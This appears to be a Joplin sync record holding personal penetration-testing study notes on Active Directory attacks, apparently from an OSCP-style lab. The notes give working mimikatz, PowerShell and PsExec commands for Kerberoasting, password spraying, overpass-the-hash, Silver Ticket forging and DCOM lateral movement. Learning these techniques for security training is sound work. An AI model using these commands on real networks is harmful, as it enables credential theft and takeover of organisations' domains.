id: 43f37ae00ee7461bad5a6a16c4515582
parent_id: 
item_type: 1
item_id: fa6e1ab4dd3643a1bda0138f71a5212b
item_updated_time: 1646016691790
title_diff: "[{\"diffs\":[[1,\"07865553b30a4727ac88b108b5e909ef\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":32}]"
body_diff: "[{\"diffs\":[[1,\"AD Attacks\\\r\\\n\\\r\\\n# Service Account Attacks\\\r\\\n\\\r\\\nWhen requesting the service ticket from DC, no checks are performed on user privileges to access service hosted by SPN.\\\r\\\n\\\r\\\nChecks only comes in when the connection is attempting to establish\\\r\\\n\\\r\\\n- If we know the SPN, we can request a service ticket for it from DC\\\r\\\n- Since it is our 'own ticket', we can extract from local memory and save it to disk\\\r\\\n\\\r\\\nOnce we know the SPN, we can use KerberosRequestorSecurityToken class to request the service ticket\\\r\\\n\\\r\\\n> Add-Type -AssemblyName System.IdentityModel\\\r\\\n\\\r\\\n> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'\\\r\\\n\\\r\\\nCalling the above command will generate the service ticket and store it in the local memory of the Win10 client.\\\r\\\n\\\r\\\n## Get the cached kerberos ticket\\\r\\\n\\\r\\\n> In mimikatz, kerberos::list; kerberos::list /export # to download to disk\\\r\\\n> \\\r\\\n> If on the machine, use klist\\\r\\\n\\\r\\\n![1b7e52ca98f75e117cd2e487882543cf.png](:/c273288a75a44e39901f7c7a2a5dff33)\\\r\\\n\\\r\\\n## Crack the hashes using the ticket and by brute force or guessing (Kerberoasting)\\\r\\\n\\\r\\\n![367e79dab9b577f2ec00eb46c9134e08.png](:/ac14701b32404969bfdd8d53a9539787)\\\r\\\n\\\r\\\n> python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt &lt;Hashfile&gt;\\\r\\\n\\\r\\\n![0d936d7ffcacd07e0364e17519bae856.png](:/ffb80db75a474daf8d4341907541ab71)\\\r\\\n\\\r\\\nWe can also use the hashcat or john to do the same thing\\\r\\\n\\\r\\\nThis technique is VERY POWERFUL if\\\r\\\n\\\r\\\n- Domain contains high-privilege service accounts with weak passwords (quite common)\\\r\\\n- (Group) Managed service accounts' Passwords are not randomly generated in high complexity (most cases on cloud instances these days)\\\r\\\n\\\r\\\n![cf1a0503d28dfc769f5521f7ab3b1398.png](:/25d9546d449c4223b2453bb8ea215c09)\\\r\\\n\\\r\\\n# Low and Slow Password Guessing\\\r\\\n\\\r\\\nFor scenarios where Caution on many failed attempts will block the account\\\r\\\n\\\r\\\nWill use LDAP and ADSI to perform the attack without triggering a account lockout\\\r\\\n\\\r\\\nDomain's account policy can be checked using net accounts\\\r\\\n\\\r\\\n![314c3a15a0499d844cf0e296dc958561.png](:/00025d3a270a4dcfb826455dd095d0b3)\\\r\\\n\\\r\\\nWe can use our powershell script to demonstrate the basic components.\\\r\\\n\\\r\\\nUse the function DirectoryEntry constructor to perform queries to the DC as any user that we know the login to\\\r\\\n\\\r\\\n```Powershell\\\r\\\n$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\\\r\\\n$PDC = ($domainObj.PdcRoleOwner).Name\\\r\\\n\\\r\\\n$SearchString = \\\"LDAP://\\\"\\\r\\\n$SearchString += $PDC + \\\"/\\\"\\\r\\\n\\\r\\\n$DistinguishName = \\\"DC=$($domainObj.Name.Replace('.',',DC='))\\\"\\\r\\\n\\\r\\\n$SearchString += $DistinguishName\\\r\\\nNew-Object System.DirectoryServices.DirectoryEntry($Searchstring, \\\"username\\\", \\\"Qwerty09!\\\")\\\r\\\n```\\\r\\\n\\\r\\\n![985c4eba39ff324baaf6eea227a2d5d6.png](:/d8f92b6eaa154116bbcb776f5801a5e3)\\\r\\\n\\\r\\\nYou can look at Spray-Passwords.ps1 inside the downloads folder (or locate it )\\\r\\\n\\\r\\\n# Lateral Movement\\\r\\\n\\\r\\\nUsing only the user's password hash or kerberos ticket\\\r\\\n\\\r\\\nPass-the-Hash - see pth-winexe\\\r\\\n\\\r\\\n## Overpass the hash\\\r\\\n\\\r\\\n\\\"Over\\\" abuse a  NTLM user hash to gain Kerberos TGT or service ticket, similar to pth-winexe\\\r\\\n\\\r\\\nIn mimikatz\\\r\\\n\\\r\\\n> sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:&lt;NTLMhash&gt; /run:Powershell.exe\\\r\\\n\\\r\\\nOnce we are in, list the kerberos tickets with klist\\\r\\\n\\\r\\\nIf no tickets are available, we can generate a TGT by authenticating to a network share on DC\\\r\\\n\\\r\\\n> net use \\\\\\\\\\\\dc01\\\r\\\n> \\\r\\\n> klist\\\r\\\n\\\r\\\n![30be3f0779d3569412dca5fc83ee6b85.png](:/16c8ba6b552d4c258c9a200d4a00557a)\\\r\\\n\\\r\\\nWith the Kerberos TGT, we can use any tools that rely on its auth.\\\r\\\n\\\r\\\n**Obtain Code Execution on the DC (using PsExec)**\\\r\\\n\\\r\\\n> ./PsExec.exe \\\\\\\\\\\\dc01 cmd.exe\\\r\\\n\\\r\\\n## Pass-The-Ticket\\\r\\\n\\\r\\\nTakes advantage of the TGS, as it may be exported and re-injected back elsewhere in the network and then used to auth a specific service.\\\r\\\n\\\r\\\nSuitable for cases where you do not have administrative accounts to execute the other methods.\\\r\\\n\\\r\\\n- Does not offer escalation; offer flexibilty to choose which machine to use the ticket from\\\r\\\n- If a service is registered with SPN and it is a local admin in any server, then use the previous methods\\\r\\\n\\\r\\\nUser and Group permissions in the service ticket are not verified by the application - app blindly trusts the integrity of the service ticket\\\r\\\n\\\r\\\n- Forge our own service ticket to access the target resource with any permissions we desire - **Silver Ticket**\\\r\\\n\\\r\\\n![b2722ba9be0c5bb4eb1a7e4a5d65dfd8.png](:/acc30ecf76ca497ca2426b9405549a62)\\\r\\\n\\\r\\\nWe can get the domain SID by using:\\\r\\\n\\\r\\\n> whoami /user\\\r\\\n\\\r\\\n![5d5e2a2710b9c078c4247c651997436b.png](:/bd0cf4f1c7e24611a040622ddf381854)\\\r\\\n\\\r\\\n![8faa77505f9635a0382d3e60d856198c.png](:/817109c8049a46b29aa916897651b50c)\\\r\\\n\\\r\\\nMethod to craft the ticket in Mimikatz\\\r\\\n\\\r\\\n> kerberos::purge\\\r\\\n> \\\r\\\n> kerberos::list # make sure it is empty\\\r\\\n> \\\r\\\n> kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt\\\r\\\n\\\r\\\n/rc4: the password hash of the iss_service service account\\\r\\\n\\\r\\\n![9fc60b320e5aa47a7e225ce1359d6855.png](:/c2469c7d959143ee983bd3c924f4c851)\\\r\\\n\\\r\\\nhttps://github.com/backlion/Offensive-Security-OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets.md\\\r\\\n\\\r\\\nAs follow up steps, we should inject the ticket into the memory and obtain a shell in the server we want to move to\\\r\\\n\\\r\\\n> mimikatz # kerberos::ptt &lt;ticket\\\\_kirbi\\\\_file&gt;\\\r\\\n> \\\r\\\n> CMD # .\\\\PsExec.exe -accepteula \\\\\\\\\\\\labwws02.jurassic.park cmd\\\r\\\n\\\r\\\nhttps://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket \\\r\\\n\\\r\\\n## DCOM (Distributed Component Object Model)\\\r\\\n\\\r\\\n![eacbf526701e8e59c1c68f4135a16115.png](:/356f1d18b595411893837bd94518826a)\\\r\\\n\\\r\\\nMust install Microsoft Office to work\\\r\\\n\\\r\\\n![e14ca8cd90ebfe9df26a40ef243c7a40.png](:/0b09b2488a1847279bd93cf3e68d5a79)\\\r\\\n\\\r\\\n![2740720923bf93debf65acfab719f817.png](:/654a3d7ad75d42a7a27311a43ae3d8a5)\\\r\\\n\\\r\\\nThis error occurs because Excel.Application is instantiated through DCOM, which is done with SYSTEM account\\\r\\\n\\\r\\\nSYSTEM does not have a profile. To fix this problem, we can simply create the Desktop folder at C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\config\\\\\\\\systemprofile\\\r\\\n\\\r\\\nCreate the directory with the following PowerShell code:\\\r\\\n\\\r\\\n> $Path = \\\"[\\\\\\\\\\\\192.168.1.110\\\\\\\\c$\\\\\\\\Windows\\\\\\\\sysWOW64\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\Desktop](file:///\\\\\\\\192.168.1.110\\\\c$\\\\Windows\\\\sysWOW64\\\\config\\\\systemprofile\\\\Desktop)\\\"\\\r\\\n\\\r\\\n> $temp = \\\\[system.io.directory\\\\]::createDirectory($Path)\\\r\\\n\\\r\\\nCalling the Open method again should now succeed. We can then call the Run method with the following script:\\\r\\\n\\\r\\\n> $com = \\\\[activator\\\\]::CreateInstance(\\\\[type\\\\]::GetTypeFromProgId(\\\"Excel.Application\\\", \\\"192 .168.1.110\\\"))\\\r\\\n\\\r\\\n> $LocalPath = \\\"C:\\\\\\\\Users\\\\\\\\jeff_admin.corp\\\\\\\\myexcel.xls\\\"\\\r\\\n> \\\r\\\n> $RemotePath = \\\"[\\\\\\\\\\\\192.168.1.110\\\\\\\\c$\\\\\\\\myexcel.xls](file:///\\\\\\\\192.168.1.110\\\\c$\\\\myexcel.xls)\\\" \\\\[System.IO.File\\\\]::Copy($LocalPath, $RemotePath, $True)\\\r\\\n> \\\r\\\n> $Path = \\\"[\\\\\\\\\\\\192.168.1.110\\\\\\\\c$\\\\\\\\Windows\\\\\\\\sysWOW64\\\\\\\\config\\\\\\\\systemprofile\\\\\\\\Desktop](file:///\\\\\\\\192.168.1.110\\\\c$\\\\Windows\\\\sysWOW64\\\\config\\\\systemprofile\\\\Desktop)\\\" $temp = \\\\[system.io.directory\\\\]::createDirectory($Path)\\\r\\\n> \\\r\\\n> $Workbook = $com.Workbooks.Open(\\\"C:\\\\\\\\myexcel.xls\\\") $com.Run(\\\"mymacro\\\")\\\r\\\n\\\r\\\nThis code should open the Notepad application as a background process executing in a high integrity context on the remote machine\\\r\\\n\\\r\\\n![5307d353cd314b401df7b8194ae1ff6a.png](:/e601279c1971474a9fffec016c8c44b8)\\\r\\\n\\\r\\\nid: 07865553b30a4727ac88b108b5e909ef\\\r\\\nparent_id: ac0bd99a1a324cb6a297fd05a2b92039\\\r\\\ncreated_time: 2022-01-30T16:15:32.188Z\\\r\\\nupdated_time: 2022-01-31T02:32:41.777Z\\\r\\\nis_conflict: 0\\\r\\\nlatitude: 0.00000000\\\r\\\nlongitude: 0.00000000\\\r\\\naltitude: 0.0000\\\r\\\nauthor: \\\r\\\nsource_url: \\\r\\\nis_todo: 0\\\r\\\ntodo_due: 0\\\r\\\ntodo_completed: 0\\\r\\\nsource: joplin-desktop\\\r\\\nsource_application: net.cozic.joplin-desktop\\\r\\\napplication_data: \\\r\\\norder: 0\\\r\\\nuser_created_time: 2022-01-30T16:15:32.188Z\\\r\\\nuser_updated_time: 2022-01-31T02:32:41.777Z\\\r\\\nencryption_cipher_text: \\\r\\\nencryption_applied: 0\\\r\\\nmarkup_language: 1\\\r\\\nis_shared: 0\\\r\\\nshare_id: \\\r\\\nconflict_original_id: \\\r\\\nmaster_key_id: \\\r\\\ntype_: 1\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":8027}]"
metadata_diff: {"new":{"id":"fa6e1ab4dd3643a1bda0138f71a5212b","parent_id":"fb73d1d872ce4ee6ab184091f1e4c67b","latitude":"0.00000000","longitude":"0.00000000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":1646016691778,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-02-28T02:54:21.422Z
created_time: 2022-02-28T02:54:21.422Z
type_: 13